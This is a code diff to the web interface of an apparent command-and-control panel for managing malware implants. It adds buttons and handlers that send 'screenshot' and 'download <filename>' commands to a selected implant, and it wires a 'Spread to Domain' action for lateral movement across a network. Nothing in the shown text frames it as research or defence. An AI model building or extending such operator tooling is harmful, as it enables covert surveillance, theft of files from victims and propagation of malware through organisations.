@@ -100,6 +100,25 @@
                             </div>
                         </form>
 
+                        <!-- Quick Actions -->
+                        <div class="mb-3">
+                            <div class="btn-group">
+                                <button class="btn btn-secondary" id="take-screenshot">
+                                    <i class="fa fa-camera"></i> Take Screenshot
+                                </button>
+                                <button class="btn btn-secondary" id="spread-domain">
+                                    <i class="fa fa-share-alt"></i> Spread to Domain
+                                </button>
+                                <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown">
+                                    <i class="fa fa-file"></i> File Operations
+                                </button>
+                                <ul class="dropdown-menu">
+                                    <li><a class="dropdown-item" href="#" id="upload-file">Upload File</a></li>
+                                    <li><a class="dropdown-item" href="#" id="download-file">Download File</a></li>
+                                </ul>
+                            </div>
+                        </div>
+
                         <!-- Command History -->
                         <div class="card mb-3">
                             <div class="card-header">
@@ -355,35 +374,46 @@
             }
         });
 
-        // Event listeners
+        // Event listeners for quick actions
+        document.getElementById('take-screenshot').addEventListener('click', () => {
+            if (!selectedImplantId) {
+                alert('Please select an implant first');
+                return;
+            }
+            socket.emit('execute_command', {
+                implant_id: selectedImplantId,
+                command: 'screenshot'
+            });
+        });
+
         document.getElementById('upload-file').addEventListener('click', () => {
+            if (!selectedImplantId) {
+                alert('Please select an implant first');
+                return;
+            }
             const modal = new bootstrap.Modal(document.getElementById('upload-modal'));
             modal.show();
         });
 
-        document.getElementById('upload-submit').addEventListener('click', () => {
-            const fileInput = document.getElementById('file-input');
-            const file = fileInput.files[0];
-            if (!file) return;
-
-            const formData = new FormData();
-            formData.append('file', file);
-
-            fetch(`/api/implants/${selectedImplantId}/upload`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                appendCommandOutput(`File upload started: ${file.name}`);
-                bootstrap.Modal.getInstance(document.getElementById('upload-modal')).hide();
-            })
-            .catch(error => {
-                appendCommandOutput(`Error: ${error.message}`);
-            });
+        document.getElementById('download-file').addEventListener('click', () => {
+            if (!selectedImplantId) {
+                alert('Please select an implant first');
+                return;
+            }
+            const filename = prompt('Enter filename to download:');
+            if (filename) {
+                socket.emit('execute_command', {
+                    implant_id: selectedImplantId,
+                    command: `download ${filename}`
+                });
+            }
         });
 
         document.getElementById('spread-domain').addEventListener('click', () => {
+            if (!selectedImplantId) {
+                alert('Please select an implant first');
+                return;
+            }
             const modal = new bootstrap.Modal(document.getElementById('spread-modal'));
             modal.show();
         });
